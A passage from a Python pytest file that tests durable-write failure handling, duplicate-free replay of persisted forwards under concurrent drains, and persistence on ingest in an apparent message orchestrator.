        assert e["msg_id"] not in t.get("held", [])

    @pytest.mark.asyncio
    async def test_wait_writes_propagates_failure(self) -> None:
        # GPT finding on 85f8fbe2: a failed durable write must surface, and
        # the generation must stay retryable (not recorded as landed).
        st = CrewStore("s1")
        with patch("pathlib.Path.replace", side_effect=OSError("disk full")):
            st.add_msg("doomed")
            with pytest.raises(OSError):
                await st.wait_writes()
        assert st._written_seq.get("queue.json", 0) == 0  # still retryable
        st.save()  # retry with healthy disk
        await st.wait_writes()
        assert CrewStore("s1").queue[0]["text"] == "doomed"


class TestGptRoundSixteen:
    """Restart replay must not duplicate, and an acknowledged row must be on disk."""

    @pytest.mark.asyncio
    async def test_two_concurrent_drains_post_each_forward_once(self) -> None:
        # `resume_persisted_slots` touches the store — which reconciles and
        # SCHEDULES a drain — and then calls `_resume_slot`, which drains again.
        # Both snapshot the pending list before either removal lands, so every
        # persisted forward was delivered twice on every restart. At-least-once
        # tolerates a duplicate after a crash; it does not excuse one by
        # construction.
        orch = _orch()
        slot = _slot()
        st = orch._store("s1")
        st.add_forward("the only copy")
        st.save()
        await st.wait_writes()

        posted: list[str] = []

        async def _record(_slot, body, kind="crew"):
            posted.append(body)
            await asyncio.sleep(0)      # a real await point between the drains
            return True

        with patch.object(orch, "_post_durable", side_effect=_record):
            await asyncio.gather(
                orch._drain_forwards(slot),
                orch._drain_forwards(slot),
            )
        assert posted == ["the only copy"], (
            f"the forward was delivered {len(posted)} times — concurrent drains "
            "are not serialized"
        )

    @pytest.mark.asyncio
    async def test_ingest_persists_the_user_row_before_returning(self) -> None:
        # The queue entry is durable, but `slot.append` only mutates memory. With
        # a plain `_post` for the ack, a crash before the periodic flush left the
        # queue holding work whose QUESTION was gone from the transcript.
        orch = _orch()
        slot = _slot()
        with _slot_save() as save, patch.object(orch, "_decide", new=AsyncMock()):
            await orch.ingest(slot, "check the feed")
        assert save.await_count == 1, (
            "ingest returned without forcing the slot to disk — the echoed user "
            "message and the acknowledgement were memory-only"
        )
